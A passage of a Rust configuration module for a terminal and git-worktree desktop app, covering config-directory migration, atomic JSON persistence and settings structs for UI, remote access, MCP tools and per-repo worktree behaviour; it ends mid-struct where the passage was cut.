use serde::{Deserialize, Serialize, de::DeserializeOwned};
use std::collections::HashMap;
use std::path::PathBuf;

/// Test-only override for the config directory.
#[cfg(test)]
static CONFIG_DIR_OVERRIDE: std::sync::Mutex<Option<PathBuf>> = std::sync::Mutex::new(None);

/// Global serialization lock for tests that call `set_config_dir_override`.
/// Held for the lifetime of the returned guard so tests in different modules
/// do not race on the shared `CONFIG_DIR_OVERRIDE` global.
#[cfg(test)]
static CONFIG_DIR_EXCLUSIVE: std::sync::Mutex<()> = std::sync::Mutex::new(());

/// Override the config directory for testing. Returns a guard that holds the
/// global `CONFIG_DIR_EXCLUSIVE` lock and restores the original value on drop.
/// All callers across all test modules are automatically serialized.
#[cfg(test)]
pub(crate) fn set_config_dir_override(dir: PathBuf) -> impl Drop {
    let lock = CONFIG_DIR_EXCLUSIVE
        .lock()
        .unwrap_or_else(|e| e.into_inner());
    *CONFIG_DIR_OVERRIDE.lock().unwrap() = Some(dir);
    struct Guard {
        _lock: std::sync::MutexGuard<'static, ()>,
    }
    impl Drop for Guard {
        fn drop(&mut self) {
            *CONFIG_DIR_OVERRIDE.lock().unwrap() = None;
        }
    }
    Guard { _lock: lock }
}

/// Get the config directory using platform-appropriate location.
///
/// - macOS: `~/Library/Application Support/com.tuic.commander/`
/// - Linux: `~/.config/com.tuic.commander/` (or `$XDG_CONFIG_HOME`)
/// - Windows: `%APPDATA%/com.tuic.commander/`
///
/// Matches Tauri's `$APPCONFIG` path (derived from the bundle identifier).
/// Falls back to `~/.tuicommander/` if platform dir is unavailable.
/// On first call, migrates from legacy locations if the new dir doesn't exist:
///   1. `{platform_config}/tuicommander/` (previous custom name)
///   2. `{platform_config}/tui-commander/` (older name)
///   3. `~/.tuicommander/` (legacy dotdir)
pub(crate) fn config_dir() -> PathBuf {
    #[cfg(test)]
    if let Some(dir) = CONFIG_DIR_OVERRIDE.lock().unwrap().clone() {
        return dir;
    }
    let new_dir = dirs::config_dir()
        .map(|d| d.join("com.tuic.commander"))
        .unwrap_or_else(legacy_dotdir);

    // Migrate if our config file is missing (the dir may already exist from Tauri's window-state plugin)
    if !new_dir.join(APP_CONFIG_FILE).exists() {
        // Try migrating from legacy dirs (newest first): tuicommander, tui-commander, ~/.tuicommander
        let platform_dir = dirs::config_dir();
        let candidates = [
            platform_dir.as_ref().map(|d| d.join("tuicommander")),
            platform_dir.as_ref().map(|d| d.join("tui-commander")),
            Some(legacy_dotdir()),
        ];

        let source = candidates.into_iter().flatten().find(|d| d.exists());

        if let Some(source) = source
            && source != new_dir
            && let Err(e) = migrate_config_dir(&source, &new_dir)
        {
            tracing::warn!("Config migration failed: {e}");
            return source;
        }
    }

    new_dir
}

/// Legacy config directory: ~/.tuicommander/
fn legacy_dotdir() -> PathBuf {
    dirs::home_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join(".tuicommander")
}

/// Copy all files from legacy config dir to new platform dir.
fn migrate_config_dir(from: &std::path::Path, to: &std::path::Path) -> Result<(), String> {
    copy_dir_recursive(from, to)?;
    tracing::info!(from = %from.display(), to = %to.display(), "Migrated config directory");
    Ok(())
}

/// Recursively copy a directory, preserving symlinks.
fn copy_dir_recursive(from: &std::path::Path, to: &std::path::Path) -> Result<(), String> {
    std::fs::create_dir_all(to)
        .map_err(|e| format!("Failed to create dir {}: {e}", to.display()))?;

    for entry in std::fs::read_dir(from)
        .map_err(|e| format!("Failed to read dir {}: {e}", from.display()))?
    {
        let entry = entry.map_err(|e| format!("Dir entry error: {e}"))?;
        let dest = to.join(entry.file_name());
        let file_type = entry
            .file_type()
            .map_err(|e| format!("File type error: {e}"))?;

        if file_type.is_symlink() {
            recreate_symlink(&entry.path(), &dest)?;
        } else if file_type.is_file() {
            std::fs::copy(entry.path(), &dest).map_err(|e| format!("Copy error: {e}"))?;
        } else if file_type.is_dir() {
            copy_dir_recursive(&entry.path(), &dest)?;
        }
    }
    Ok(())
}

/// Recreate a symlink at `dest` pointing to the same target as `source`.
fn recreate_symlink(source: &std::path::Path, dest: &std::path::Path) -> Result<(), String> {
    let target = std::fs::read_link(source)
        .map_err(|e| format!("Failed to read symlink {}: {e}", source.display()))?;
    #[cfg(unix)]
    std::os::unix::fs::symlink(&target, dest)
        .map_err(|e| format!("Failed to create symlink {}: {e}", dest.display()))?;
    #[cfg(windows)]
    {
        // Windows requires different calls for file vs directory symlinks
        let is_dir = std::fs::metadata(&target)
            .map(|m| m.is_dir())
            .unwrap_or(false);
        if is_dir {
            std::os::windows::fs::symlink_dir(&target, dest)
        } else {
            std::os::windows::fs::symlink_file(&target, dest)
        }
        .map_err(|e| format!("Failed to create symlink {}: {e}", dest.display()))?;
    }
    Ok(())
}

/// Load a JSON config file, returning Default if missing or corrupt.
/// Logs warnings/errors when the file exists but cannot be read or parsed,
/// so corrupt files are visible in logs instead of silently resetting state.
pub(crate) fn load_json_config<T: DeserializeOwned + Default>(filename: &str) -> T {
    let path = config_dir().join(filename);
    if !path.exists() {
        return T::default();
    }
    let content = match std::fs::read_to_string(&path) {
        Ok(s) => s,
        Err(e) => {
            tracing::warn!(path = %path.display(), "Could not read config: {e}");
            return T::default();
        }
    };
    match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            tracing::error!(path = %path.display(), "Corrupt config: {e}. Using defaults.");
            T::default()
        }
    }
}

/// Atomically write `data` to `target` via temp+rename with 0600 perms.
pub(crate) fn persist_atomic(target: &std::path::Path, data: &[u8]) -> Result<(), String> {
    if let Some(dir) = target.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("Failed to create directory: {e}"))?;
    }
    let temp = target.with_extension(format!("tmp.{}", std::process::id()));
    std::fs::write(&temp, data).map_err(|e| format!("Failed to write temp file: {e}"))?;

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let perms = std::fs::Permissions::from_mode(0o600);
        std::fs::set_permissions(&temp, perms)
            .map_err(|e| format!("Failed to set permissions: {e}"))?;
    }

    std::fs::rename(&temp, target).map_err(|e| {
        let _ = std::fs::remove_file(&temp);
        format!("Failed to commit file: {e}")
    })?;
    Ok(())
}

/// Save a JSON config file atomically (temp file + rename).
/// Sets 0600 permissions on Unix to protect sensitive data.
pub(crate) fn save_json_config<T: Serialize>(filename: &str, config: &T) -> Result<(), String> {
    let json = serde_json::to_string_pretty(config)
        .map_err(|e| format!("Failed to serialize config: {e}"))?;
    let target = config_dir().join(filename);
    persist_atomic(&target, json.as_bytes())
}

// ---------------------------------------------------------------------------
// AppConfig — previously in lib.rs, now lives here
// ---------------------------------------------------------------------------

/// Whether split terminal panes get separate tabs or share a unified tab
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum SplitTabMode {
    #[default]
    Separate,
    Unified,
}

/// Tab ordering mode for the tab bar
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum TabOrderingMode {
    #[default]
    GroupedByType,
    TerminalsFirst,
    Free,
}

/// Where to create worktree directories
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub(crate) enum WorktreeStorage {
    /// `~/dev/myrepo__wt/feat-123` — sibling dir next to repo
    #[default]
    Sibling,
    /// `~/Library/.../tuicommander/worktrees/repo/feat-123` — app config dir
    AppDir,
    /// `<repo>/.worktrees/feat-123` — inside the repository
    InsideRepo,
    /// `<repo>/.claude/worktrees/feat-123` — Claude Code default location
    ClaudeCodeDefault,
}

/// How to handle orphan worktrees (branch deleted)
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum OrphanCleanup {
    /// Auto-remove worktree + prune
    On,
    /// Ignore, keep in sidebar
    Off,
    /// Show toast with Remove/Keep action
    #[default]
    Ask,
}

/// Git merge strategy for PRs
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum MergeStrategy {
    #[default]
    Merge,
    Squash,
    Rebase,
}

/// What to do with a worktree after its branch is merged
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum WorktreeAfterMerge {
    /// Move to __archived/ subdir
    #[default]
    Archive,
    /// Remove worktree and branch entirely
    Delete,
    /// Show confirmation dialog
    Ask,
}

/// Auto-delete local branch when PR is merged/closed
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum AutoDeleteOnPrClose {
    #[default]
    Off,
    Ask,
    Auto,
}

// ---------------------------------------------------------------------------
// ServicesConfig — nested config for remote access, auth, relay, push
// ---------------------------------------------------------------------------

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct ServerConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default = "default_remote_port")]
    pub(crate) port: u16,
    #[serde(default)]
    pub(crate) ipv6_enabled: bool,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            port: default_remote_port(),
            ipv6_enabled: false,
        }
    }
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct AuthConfig {
    #[serde(default)]
    pub(crate) username: String,
    #[serde(default)]
    pub(crate) password_hash: String,
    #[serde(default)]
    pub(crate) session_token: String,
    #[serde(default = "default_session_token_duration_secs")]
    pub(crate) session_token_duration_secs: u64,
    #[serde(default)]
    pub(crate) lan_auth_bypass: bool,
    #[serde(default = "default_auth_rate_limit_max")]
    pub(crate) auth_rate_limit_max: u32,
    #[serde(default = "default_auth_rate_limit_window_secs")]
    pub(crate) auth_rate_limit_window_secs: u64,
}

fn default_auth_rate_limit_max() -> u32 {
    5
}
fn default_auth_rate_limit_window_secs() -> u64 {
    300
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            username: String::new(),
            password_hash: String::new(),
            session_token: String::new(),
            session_token_duration_secs: default_session_token_duration_secs(),
            lan_auth_bypass: false,
            auth_rate_limit_max: default_auth_rate_limit_max(),
            auth_rate_limit_window_secs: default_auth_rate_limit_window_secs(),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize)]
#[serde(tag = "mode", rename_all = "lowercase")]
pub(crate) enum TlsConfig {
    #[default]
    Off,
    Manual {
        cert_path: String,
        key_path: String,
    },
}

impl<'de> serde::Deserialize<'de> for TlsConfig {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let val = serde_json::Value::deserialize(deserializer)?;
        match val.as_object() {
            Some(obj)
                if obj.is_empty() || obj.get("mode").and_then(|v| v.as_str()) == Some("off") =>
            {
                Ok(TlsConfig::Off)
            }
            Some(obj) if obj.get("mode").and_then(|v| v.as_str()) == Some("manual") => {
                let cert_path = obj
                    .get("cert_path")
                    .and_then(|v| v.as_str())
                    .unwrap_or_default()
                    .to_string();
                let key_path = obj
                    .get("key_path")
                    .and_then(|v| v.as_str())
                    .unwrap_or_default()
                    .to_string();
                Ok(TlsConfig::Manual {
                    cert_path,
                    key_path,
                })
            }
            _ => Ok(TlsConfig::Off),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct RelayConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default)]
    pub(crate) url: String,
    #[serde(default)]
    pub(crate) token: String,
    #[serde(default)]
    pub(crate) session_id: String,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub(crate) struct PushConfig {
    #[serde(default)]
    pub(crate) enabled: bool,
    #[serde(default)]
    pub(crate) vapid_private_key: String,
    #[serde(default)]
    pub(crate) vapid_public_key: String,
    #[serde(default = "default_vapid_subject")]
    pub(crate) vapid_subject: String,
}

impl Default for PushConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            vapid_private_key: String::new(),
            vapid_public_key: String::new(),
            vapid_subject: default_vapid_subject(),
        }
    }
}

#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct ServicesConfig {
    #[serde(default)]
    pub(crate) server: ServerConfig,
    #[serde(default)]
    pub(crate) auth: AuthConfig,
    #[serde(default)]
    pub(crate) tls: TlsConfig,
    #[serde(default)]
    pub(crate) relay: RelayConfig,
    #[serde(default)]
    pub(crate) push: PushConfig,
}

impl ServicesConfig {
    #[allow(dead_code)]
    pub(crate) fn validate(&self) -> Vec<String> {
        let mut warnings = Vec::new();
        if self.server.enabled && self.auth.password_hash.is_empty() && !self.auth.lan_auth_bypass {
            warnings.push(
                "Remote access enabled with no password and LAN bypass off — \
                 all connections will require auth but no password is set"
                    .to_string(),
            );
        }
        if self.relay.enabled && self.relay.token.is_empty() {
            warnings.push("Relay enabled but relay token is empty".to_string());
        }
        if self.push.enabled && self.push.vapid_private_key.is_empty() {
            warnings.push("Push enabled but VAPID private key is empty".to_string());
        }
        warnings
    }
}

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct AppConfig {
    pub(crate) shell: Option<String>,
    pub(crate) font_family: String,
    pub(crate) font_size: u16,
    /// Terminal font weight (100–900, e.g. 200 = ExtraLight, 400 = Regular)
    #[serde(default = "default_font_weight")]
    pub(crate) font_weight: u16,
    pub(crate) theme: String,
    /// Enable MCP HTTP API on localhost for external tool integration
    #[serde(default)]
    pub(crate) mcp_server_enabled: bool,
    /// Fixed port for MCP server (0 = OS-assigned)
    #[serde(default = "default_mcp_port")]
    pub(crate) mcp_port: u16,
    /// Whether MCP config has been auto-installed in agent configs
    #[serde(default)]
    pub(crate) mcp_config_installed: bool,
    /// Preferred IDE (e.g. "vscode", "cursor")
    #[serde(default)]
    pub(crate) ide: String,
    /// Default font size for new terminals
    #[serde(default = "default_font_size")]
    pub(crate) default_font_size: u16,
    #[serde(default)]
    pub(crate) services: ServicesConfig,
    /// Show confirmation dialog when quitting with active terminals
    #[serde(default = "default_true")]
    pub(crate) confirm_before_quit: bool,
    /// Show confirmation dialog when closing a terminal tab
    #[serde(default = "default_true")]
    pub(crate) confirm_before_closing_tab: bool,
    /// Maximum characters for tab names before truncation
    #[serde(default = "default_max_tab_name_length")]
    pub(crate) max_tab_name_length: u32,
    /// Split tab mode: separate (each pane gets a tab) or unified (one shared tab)
    #[serde(default)]
    pub(crate) split_tab_mode: SplitTabMode,
    /// Tab ordering mode: grouped-by-type, terminals-first, or free
    #[serde(default)]
    pub(crate) tab_ordering_mode: TabOrderingMode,
    /// Auto-show PR detail popover when a branch has PR data
    #[serde(default = "default_true")]
    pub(crate) auto_show_pr_popover: bool,
    /// Prevent system sleep while any terminal session is busy
    #[serde(default)]
    pub(crate) prevent_sleep_when_busy: bool,
    /// Automatically check for app updates on startup
    #[serde(default = "default_true")]
    pub(crate) auto_update_enabled: bool,
    /// Automatically check for plugin updates on startup
    #[serde(default = "default_true")]
    pub(crate) auto_update_plugins_enabled: bool,
    /// UI language code (e.g. "en", "it", "de")
    #[serde(default = "default_language")]
    pub(crate) language: String,
    /// Plugin IDs that the user has disabled (not loaded on startup)
    #[serde(default)]
    pub(crate) disabled_plugin_ids: Vec<String>,
    /// Update channel: "stable" or "nightly"
    #[serde(default = "default_update_channel")]
    pub(crate) update_channel: String,
    /// Agent types disabled by the user (won't appear in sidebar "Add Agent" menu)
    #[serde(default)]
    pub(crate) disabled_agents: Vec<String>,
    /// Agent types whose MCP bridge config is disabled (ensure_mcp_configs skips these)
    #[serde(default)]
    pub(crate) disabled_mcp_agents: Vec<String>,
    /// Native MCP tool names disabled by the user (excluded from tools/list response)
    #[serde(default)]
    pub(crate) disabled_native_tools: Vec<String>,
    /// Collapse all MCP tools into 3 meta-tools (search_tools, get_tool_schema, call_tool).
    /// Reduces AI context from ~35k to ~500 tokens. Default: false (individual tools exposed).
    #[serde(default)]
    pub(crate) collapse_tools: bool,
    /// Show agent intent as tab title (from `intent: text (title)` tokens)
    #[serde(default = "default_true")]
    pub(crate) intent_tab_title: bool,
    /// Show suggested follow-up actions from agents (from `suggest: A | B | C` tokens)
    #[serde(default = "default_true")]
    pub(crate) suggest_followups: bool,
    /// Auto-copy terminal selection to clipboard
    #[serde(default = "default_true")]
    pub(crate) copy_on_select: bool,
    /// Show last prompt overlay bar at the top of the terminal
    #[serde(default = "default_true")]
    pub(crate) show_last_prompt: bool,
    /// Terminal bell style: "none", "visual", "sound", or "both"
    #[serde(default = "default_bell_style")]
    pub(crate) bell_style: String,
    /// Global OS-level hotkey combo to toggle window visibility (e.g. "CommandOrControl+Shift+T")
    #[serde(default)]
    pub(crate) global_hotkey: Option<String>,
    /// Default issue filter mode: "assigned", "created", "mentioned", "all", or "disabled"
    #[serde(default = "default_issue_filter")]
    pub(crate) issue_filter: String,
    /// Master toggle for experimental features
    #[serde(default)]
    pub(crate) experimental_features_enabled: bool,
    /// Sub-flag: AI Chat panel, shortcuts, and palette entry
    #[serde(default)]
    pub(crate) ai_chat_enabled: bool,
    /// Sub-flag: AI Triage (diff classification)
    #[serde(default)]
    pub(crate) ai_triage_enabled: bool,
    /// Sub-flag: AI Watchers (terminal event watchers)
    #[serde(default)]
    pub(crate) ai_watchers_enabled: bool,
    /// Sub-flag: reflow scrollback history on column resize. Keeps scrollback
    /// readable when side panels temporarily narrow the terminal, without
    /// affecting cursor-addressed TUIs on the visible screen.
    #[serde(default)]
    pub(crate) scrollback_reflow: bool,
    /// Terminal cursor style: "bar" (default), "block", "underline"
    #[serde(default = "default_cursor_style")]
    pub(crate) cursor_style: String,
    /// Terminal renderer: "webgl" (default, GPU-accelerated) or "canvas" (CPU, no atlas bugs)
    #[serde(default = "default_terminal_renderer")]
    pub(crate) terminal_renderer: String,
    /// Expose `ai_terminal_*` tools to external MCP. Default off: they need a
    /// per-session filesystem sandbox only the internal agent loop creates.
    ///
    /// Read at three sites (`merged_tool_definitions`, `searchable_tool_definitions`,
    /// `handle_mcp_tool_call` dispatch). This flag has NO live-reload semantics:
    /// a client may see a tools-list snapshot before a toggle and a dispatch-time
    /// rejection after. Coordinate those call sites if live reload is ever added.
    #[serde(default)]
    pub(crate) ai_terminal_mcp_enabled: bool,
}

fn default_language() -> String {
    "en".to_string()
}

fn default_vapid_subject() -> String {
    "mailto:noreply@tuicommander.com".to_string()
}

fn default_update_channel() -> String {
    "stable".to_string()
}

fn default_session_token_duration_secs() -> u64 {
    86400
}

fn default_bell_style() -> String {
    "visual".to_string()
}

fn default_issue_filter() -> String {
    "assigned".to_string()
}

fn default_cursor_style() -> String {
    "bar".to_string()
}

fn default_terminal_renderer() -> String {
    "webgl".to_string()
}

fn default_mcp_port() -> u16 {
    3845
}

fn default_font_size() -> u16 {
    13
}

fn default_font_weight() -> u16 {
    400
}

fn default_max_tab_name_length() -> u32 {
    25
}

fn default_remote_port() -> u16 {
    9876
}

impl Default for AppConfig {
    fn default() -> Self {
        Self {
            shell: None,
            font_family: "JetBrains Mono".to_string(),
            font_size: 14,
            font_weight: default_font_weight(),
            theme: "vscode-dark".to_string(),
            mcp_server_enabled: true,
            mcp_port: default_mcp_port(),
            mcp_config_installed: false,
            ide: String::new(),
            default_font_size: 13,
            services: ServicesConfig::default(),
            confirm_before_quit: true,
            confirm_before_closing_tab: true,
            max_tab_name_length: default_max_tab_name_length(),
            split_tab_mode: SplitTabMode::default(),
            tab_ordering_mode: TabOrderingMode::default(),
            auto_show_pr_popover: true,
            prevent_sleep_when_busy: false,
            auto_update_enabled: true,
            auto_update_plugins_enabled: true,
            language: default_language(),
            disabled_plugin_ids: Vec::new(),
            update_channel: default_update_channel(),
            disabled_agents: Vec::new(),
            disabled_mcp_agents: Vec::new(),
            disabled_native_tools: vec!["config".to_string(), "debug".to_string()],
            intent_tab_title: true,
            suggest_followups: true,
            copy_on_select: true,
            show_last_prompt: true,
            bell_style: default_bell_style(),
            global_hotkey: None,
            collapse_tools: false,
            issue_filter: default_issue_filter(),
            experimental_features_enabled: false,
            ai_chat_enabled: false,
            ai_triage_enabled: false,
            ai_watchers_enabled: false,
            scrollback_reflow: false,
            cursor_style: default_cursor_style(),
            terminal_renderer: default_terminal_renderer(),
            ai_terminal_mcp_enabled: false,
        }
    }
}

impl AppConfig {
    #[allow(dead_code)]
    pub(crate) fn is_experimental_enabled(&self, sub_flag: bool) -> bool {
        self.experimental_features_enabled && sub_flag
    }
}

// ---------------------------------------------------------------------------
// NotificationConfig
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct NotificationSounds {
    #[serde(default = "default_true")]
    pub(crate) question: bool,
    #[serde(default = "default_true")]
    pub(crate) error: bool,
    #[serde(default = "default_true")]
    pub(crate) completion: bool,
    #[serde(default = "default_true")]
    pub(crate) warning: bool,
    #[serde(default = "default_true")]
    pub(crate) info: bool,
}

impl Default for NotificationSounds {
    fn default() -> Self {
        Self {
            question: true,
            error: true,
            completion: true,
            warning: true,
            info: true,
        }
    }
}

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct NotificationConfig {
    #[serde(default = "default_true")]
    pub(crate) enabled: bool,
    #[serde(default = "default_volume")]
    pub(crate) volume: f64,
    #[serde(default)]
    pub(crate) sounds: NotificationSounds,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) audio_device: Option<String>,
}

fn default_true() -> bool {
    true
}

fn default_volume() -> f64 {
    0.5
}

impl Default for NotificationConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            volume: 0.5,
            sounds: NotificationSounds::default(),
            audio_device: None,
        }
    }
}

// ---------------------------------------------------------------------------
// UIPrefsConfig — sidebar, panel sizes, settings nav width
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct UIPrefsConfig {
    #[serde(default = "default_true")]
    pub(crate) sidebar_visible: bool,
    #[serde(default = "default_sidebar_width")]
    pub(crate) sidebar_width: u32,
    #[serde(default)]
    pub(crate) diff_panel_visible: bool,
    #[serde(default)]
    pub(crate) markdown_panel_visible: bool,
    #[serde(default)]
    pub(crate) notes_panel_visible: bool,
    #[serde(default)]
    pub(crate) file_browser_panel_visible: bool,
    #[serde(default)]
    pub(crate) plan_panel_visible: bool,
    #[serde(default)]
    pub(crate) git_panel_visible: bool,
    #[serde(default = "default_panel_width")]
    pub(crate) diff_panel_width: u32,
    #[serde(default = "default_panel_width")]
    pub(crate) markdown_panel_width: u32,
    #[serde(default = "default_notes_panel_width")]
    pub(crate) notes_panel_width: u32,
    #[serde(default = "default_plan_panel_width")]
    pub(crate) plan_panel_width: u32,
    #[serde(default = "default_git_panel_width")]
    pub(crate) git_panel_width: u32,
    #[serde(default = "default_settings_nav_width")]
    pub(crate) settings_nav_width: u32,
    /// Diff viewer mode: "split" (side-by-side) or "unified" (inline).
    #[serde(default = "default_diff_view_mode")]
    pub(crate) diff_view_mode: String,
    #[serde(default)]
    pub(crate) detached_panels: std::collections::HashMap<String, String>,
}

fn default_diff_view_mode() -> String {
    "split".to_string()
}

impl Default for UIPrefsConfig {
    fn default() -> Self {
        Self {
            sidebar_visible: true,
            sidebar_width: default_sidebar_width(),
            diff_panel_visible: false,
            markdown_panel_visible: false,
            notes_panel_visible: false,
            file_browser_panel_visible: false,
            plan_panel_visible: false,
            git_panel_visible: false,
            diff_panel_width: default_panel_width(),
            markdown_panel_width: default_panel_width(),
            notes_panel_width: default_notes_panel_width(),
            plan_panel_width: default_plan_panel_width(),
            git_panel_width: default_git_panel_width(),
            settings_nav_width: default_settings_nav_width(),
            diff_view_mode: default_diff_view_mode(),
            detached_panels: std::collections::HashMap::new(),
        }
    }
}

fn default_sidebar_width() -> u32 {
    260
}
fn default_panel_width() -> u32 {
    400
}
fn default_notes_panel_width() -> u32 {
    350
}
fn default_plan_panel_width() -> u32 {
    350
}
fn default_git_panel_width() -> u32 {
    380
}
fn default_settings_nav_width() -> u32 {
    180
}

// ---------------------------------------------------------------------------
// RepoLocalConfig — team-shareable settings loaded from .tuic.json in repo root
// ---------------------------------------------------------------------------

/// Settings loaded from `.tuic.json` at the repository root.
/// These are team-shareable (committed to the repo) and override global defaults
/// but are overridden by per-repo app settings.
#[derive(Clone, Debug, Default, Serialize, Deserialize)]
pub(crate) struct RepoLocalConfig {
    #[serde(default)]
    pub(crate) base_branch: Option<String>,
    #[serde(default)]
    pub(crate) copy_ignored_files: Option<bool>,
    #[serde(default)]
    pub(crate) copy_untracked_files: Option<bool>,
    // Script fields (setup_script, run_script, archive_script) intentionally
    // omitted — executing repo-committed scripts without TOFU prompt is unsafe.
    // Re-add when trust-on-first-use confirmation is implemented.
    #[serde(default)]
    pub(crate) worktree_storage: Option<WorktreeStorage>,
    #[serde(default)]
    pub(crate) delete_branch_on_remove: Option<bool>,
    #[serde(default)]
    pub(crate) auto_archive_merged: Option<bool>,
    #[serde(default)]
    pub(crate) orphan_cleanup: Option<OrphanCleanup>,
    #[serde(default)]
    pub(crate) pr_merge_strategy: Option<MergeStrategy>,
    #[serde(default)]
    pub(crate) after_merge: Option<WorktreeAfterMerge>,
    #[serde(default)]
    pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
    /// Allowlist of upstream MCP server names relevant to this repo (None = all)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) mcp_upstreams: Option<Vec<String>>,
}

const REPO_LOCAL_CONFIG_FILE: &str = ".tuic.json";

/// Load `.tuic.json` from a repository root.
/// Returns `None` if the file doesn't exist or is malformed.
pub(crate) fn load_repo_local_config_from_path(
    repo_path: &std::path::Path,
) -> Option<RepoLocalConfig> {
    let path = repo_path.join(REPO_LOCAL_CONFIG_FILE);
    match std::fs::read_to_string(&path) {
        Ok(contents) => match serde_json::from_str::<RepoLocalConfig>(&contents) {
            Ok(config) => Some(config),
            Err(e) => {
                tracing::warn!(path = %path.display(), "Malformed config: {e}");
                None
            }
        },
        Err(_) => None,
    }
}

// ---------------------------------------------------------------------------
// RepoSettingsMap — per-repo settings keyed by repo path
// ---------------------------------------------------------------------------

#[derive(Clone, Default, Serialize, Deserialize)]
pub(crate) struct RepoSettingsEntry {
    pub(crate) path: String,
    #[serde(default)]
    pub(crate) display_name: String,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) base_branch: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) copy_ignored_files: Option<bool>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) copy_untracked_files: Option<bool>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) setup_script: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) run_script: Option<String>,
    /// null = inherit from global repo defaults
    #[serde(default)]
    pub(crate) archive_script: Option<String>,
    #[serde(default)]
    pub(crate) color: String,
    // -- Worktree settings (null = inherit from global) --
    #[serde(default)]
    pub(crate) worktree_storage: Option<WorktreeStorage>,
    #[serde(default)]
    pub(crate) prompt_on_create: Option<bool>,
    #[serde(default)]
    pub(crate) delete_branch_on_remove: Option<bool>,
    #[serde(default)]
    pub(crate) auto_archive_merged: Option<bool>,
    #[serde(default)]
    pub(crate) orphan_cleanup: Option<OrphanCleanup>,
    #[serde(default)]
    pub(crate) pr_merge_strategy: Option<MergeStrategy>,
    #[serde(default)]
    pub(crate) after_merge: Option<WorktreeAfterMerge>,
    /// Auto-fetch interval in minutes (0 or None = disabled)
    #[serde(default)]
    pub(crate) auto_fetch_interval_minutes: Option<u32>,
    /// Auto-delete local branch when PR is merged/closed
    #[serde(default)]
    pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
    /// Allowlist of upstream MCP server names relevant to this repo (None = all)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) mcp_upstreams: Option<Vec<String>>,
    /// Human-readable labels for branches/worktrees, keyed by branch name
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub(crate) branch_labels: HashMap<String, String>,
}

impl RepoSettingsEntry {
    /// Check if this entry has any non-default settings
    pub(crate) fn has_custom_settings(&self) -> bool {
        self.base_branch.is_some()
            || self.copy_ignored_files.is_some()
            || self.copy_untracked_files.is_some()
            || self.setup_script.is_some()
            || self.run_script.is_some()
            || self.archive_script.is_some()
            || !self.color.is_empty()
            || self.worktree_storage.is_some()
            || self.prompt_on_create.is_some()
            || self.delete_branch_on_remove.is_some()
            || self.auto_archive_merged.is_some()
            || self.orphan_cleanup.is_some()
            || self.pr_merge_strategy.is_some()
            || self.after_merge.is_some()
            || self.auto_fetch_interval_minutes.is_some()
            || self.auto_delete_on_pr_close.is_some()
            || self.mcp_upstreams.is_some()
            || !self.branch_labels.is_empty()
    }
}

/// Global defaults applied to all repos unless overridden per-repo
#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct RepoDefaultsConfig {
    #[serde(default = "default_base_branch")]
    pub(crate) base_branch: String,
    #[serde(default)]
    pub(crate) copy_ignored_files: bool,
    #[serde(default)]
    pub(crate) copy_untracked_files: bool,
    #[serde(default)]
    pub(crate) setup_script: String,
    #[serde(default)]
    pub(crate) run_script: String,
    #[serde(default)]
    pub(crate) archive_script: String,
    // -- Worktree settings --
    #[serde(default)]
    pub(crate) worktree_storage: WorktreeStorage,
    #[serde(default = "default_true")]
    pub(crate) prompt_on_create: bool,
    #[serde(default = "default_true")]
    pub(crate) delete_branch_on_remove: bool,
    #[serde(default)]
    pub(crate) auto_archive_merged: bool,
    #[serde(default)]
    pub(crate) orphan_cleanup: OrphanCleanup,
    #[serde(default)]
    pub(crate) pr_merge_strategy: MergeStrategy,
    #[serde(default)]
    pub(crate) after_merge: WorktreeAfterMerge,
    /// Auto-fetch interval in minutes (0 = disabled)
    #[serde(default)]
    pub(crate) auto_fetch_interval_minutes: u32,
    /// Auto-delete local branch when PR is merged/closed
    #[serde(default)]
